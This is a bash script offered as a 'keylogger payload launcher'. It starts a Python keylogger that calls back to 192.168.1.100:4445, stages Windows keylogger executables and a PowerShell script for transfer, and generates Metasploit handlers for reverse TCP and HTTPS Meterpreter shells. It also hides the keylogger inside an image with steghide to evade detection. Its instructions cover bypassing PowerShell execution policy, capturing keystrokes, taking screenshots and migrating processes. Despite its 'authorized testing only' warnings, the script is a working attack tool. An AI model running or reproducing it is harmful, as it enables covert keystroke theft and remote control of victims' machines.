#!/bin/bash

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

clear

echo -e "${GREEN}=======================================${NC}"
echo -e "${GREEN}    KEYLOGGER PAYLOAD LAUNCHER${NC}"
echo -e "${GREEN}=======================================${NC}"
echo ""
echo -e "${RED}⚠️  WARNING: For authorized testing only!${NC}"
echo -e "${RED}Only use on systems you own or have permission to test.${NC}"
echo ""
echo -e "${BLUE}Available Options:${NC}"
echo ""
echo -e "${YELLOW}1.${NC} Launch Python Cross-Platform Payload (Port 4445)"
echo "   - Works on Linux/Windows/macOS"
echo "   - Connects to 192.168.1.100:4445"
echo ""
echo -e "${YELLOW}2.${NC} Copy Windows Payloads to /tmp/"
echo "   - Copies .exe and .ps1 files for later use"
echo "   - Useful for transferring to Windows systems"
echo ""
echo -e "${YELLOW}3.${NC} Start Metasploit Handlers"
echo "   - Automatically configures handlers"
echo "   - Sets up listeners for all payload types"
echo ""
echo -e "${YELLOW}4.${NC} Show Network Information"
echo "   - Display current IP configuration"
echo "   - Useful for configuring handlers"
echo ""
echo -e "${YELLOW}5.${NC} Create Steganographic Payload"
echo "   - Hide payload in image file"
echo "   - Advanced evasion technique"
echo ""
echo -e "${YELLOW}6.${NC} Show Usage Instructions"
echo ""
echo -e "${YELLOW}7.${NC} Exit"
echo ""

read -p "Select option (1-7): " choice

case $choice in
    1)
        echo ""
        echo -e "${GREEN}Launching Python payload...${NC}"
        echo -e "${BLUE}Make sure handler is listening on 192.168.1.100:4445${NC}"
        echo ""
        
        if command -v python3 &> /dev/null; then
            echo "Using Python 3..."
            sleep 2
            python3 python_keylogger_test.py
        elif command -v python &> /dev/null; then
            echo "Using Python 2..."
            sleep 2
            python python_keylogger_test.py
        else
            echo -e "${RED}Python not found! Please install Python.${NC}"
            exit 1
        fi
        ;;
    
    2)
        echo ""
        echo -e "${GREEN}Copying Windows payloads to /tmp/${NC}"
        
        if [ -f "windows_keylogger_test.exe" ]; then
            cp windows_keylogger_test.exe /tmp/
            echo "✓ Copied windows_keylogger_test.exe"
        fi
        
        if [ -f "windows_https_keylogger.exe" ]; then
            cp windows_https_keylogger.exe /tmp/
            echo "✓ Copied windows_https_keylogger.exe"
        fi
        
        if [ -f "powershell_keylogger.ps1" ]; then
            cp powershell_keylogger.ps1 /tmp/
            echo "✓ Copied powershell_keylogger.ps1"
        fi
        
        echo ""
        echo -e "${BLUE}Payloads copied to /tmp/ directory${NC}"
        echo "You can now transfer them to Windows systems for testing"
        ;;
    
    3)
        echo ""
        echo -e "${GREEN}Starting Metasploit handlers...${NC}"
        echo ""
        
        if ! command -v msfconsole &> /dev/null; then
            echo -e "${RED}Metasploit not found! Please install Metasploit Framework.${NC}"
            exit 1
        fi
        
        # Get local IP address
        LOCAL_IP=$(hostname -I | awk '{print $1}')
        echo "Detected local IP: $LOCAL_IP"
        read -p "Use this IP or enter different IP (press Enter for detected): " USER_IP
        
        if [ ! -z "$USER_IP" ]; then
            LOCAL_IP=$USER_IP
        fi
        
        echo "Setting up handlers with IP: $LOCAL_IP"
        
        # Create dynamic handler script
        cat > temp_handlers.rc << EOF
# Auto-generated handler script for USB payloads
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT 4444
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT 4445
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LOCAL_IP
set LPORT 443
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 8080
set ExitOnSession false
exploit -j

sessions -l
EOF
        
        echo "Launching Metasploit with handlers..."
        msfconsole -r temp_handlers.rc
        ;;
    
    4)
        echo ""
        echo -e "${GREEN}Network Information:${NC}"
        echo "===================="
        echo ""
        echo "IP Addresses:"
        ip addr show | grep "inet " | awk '{print $2}' | grep -v 127.0.0.1
        echo ""
        echo "Default Gateway:"
        ip route | grep default | awk '{print $3}'
        echo ""
        echo "Network Interfaces:"
        ip link show | grep -E "^[0-9]" | awk -F: '{print $2}' | sed 's/^ //'
        ;;
    
    5)
        echo ""
        echo -e "${GREEN}Creating steganographic payload...${NC}"
        echo ""
        
        if ! command -v steghide &> /dev/null; then
            echo -e "${RED}steghide not found! Installing...${NC}"
            sudo apt update && sudo apt install steghide -y
        fi
        
        # Check if we have a cover image
        if [ ! -f "cover.jpg" ]; then
            echo "Creating sample cover image..."
            # Create a simple image using ImageMagick if available
            if command -v convert &> /dev/null; then
                convert -size 800x600 xc:blue cover.jpg
            else
                echo -e "${RED}No cover image found and ImageMagick not available.${NC}"
                echo "Please provide a cover.jpg file for steganography."
                exit 1
            fi
        fi
        
        read -p "Enter password for steganographic payload: " -s steg_password
        echo ""
        
        if [ -f "python_keylogger_test.py" ]; then
            steghide embed -cf cover.jpg -ef python_keylogger_test.py -p "$steg_password" -sf stego_payload.jpg
            echo -e "${GREEN}✓ Steganographic payload created: stego_payload.jpg${NC}"
            echo ""
            echo "To extract on target system:"
            echo "steghide extract -sf stego_payload.jpg -p [password]"
        else
            echo -e "${RED}python_keylogger_test.py not found!${NC}"
        fi
        ;;
    
    6)
        echo ""
        echo -e "${GREEN}USAGE INSTRUCTIONS:${NC}"
        echo "==================="
        echo ""
        echo -e "${BLUE}1. Handler Setup:${NC}"
        echo "   On your Kali machine:"
        echo "   msfconsole -r handler_setup.rc"
        echo ""
        echo -e "${BLUE}2. Payload Execution:${NC}"
        echo "   Windows: Double-click .exe files or run autorun.bat"
        echo "   Linux:   python3 python_keylogger_test.py"
        echo "   PowerShell: powershell -ExecutionPolicy Bypass -File payload.ps1"
        echo ""
        echo -e "${BLUE}3. Keylogger Commands (in Meterpreter):${NC}"
        echo "   keyscan_start  - Begin capturing keystrokes"
        echo "   keyscan_dump   - Display captured keys"
        echo "   keyscan_stop   - Stop keylogger"
        echo ""
        echo -e "${BLUE}4. Additional Commands:${NC}"
        echo "   sysinfo        - System information"
        echo "   screenshot     - Take screenshot"
        echo "   ps             - List processes"
        echo "   migrate <PID>  - Move to different process"
        echo ""
        echo -e "${RED}5. Important Reminders:${NC}"
        echo "   - Only use on authorized systems"
        echo "   - Clean up after testing"
        echo "   - Document all activities"
        echo "   - Follow legal guidelines"
        ;;
    
    7)
        echo ""
        echo -e "${GREEN}Exiting payload launcher.${NC}"
        echo -e "${YELLOW}Remember to clean up after testing!${NC}"
        exit 0
        ;;
    
    *)
        echo ""
        echo -e "${RED}Invalid selection. Please choose 1-7.${NC}"
        sleep 2
        exec "$0"  # Restart script
        ;;
esac

echo ""
echo -e "${GREEN}Operation completed.${NC}"
echo -e "${YELLOW}Check your Metasploit console for connections.${NC}"
echo ""
read -p "Press Enter to continue..."